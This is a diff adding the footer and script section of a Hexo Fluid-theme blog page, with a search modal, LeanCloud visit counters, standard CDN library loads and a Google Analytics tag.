+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RLPQJE3YTB"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-RLPQJE3YTB');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
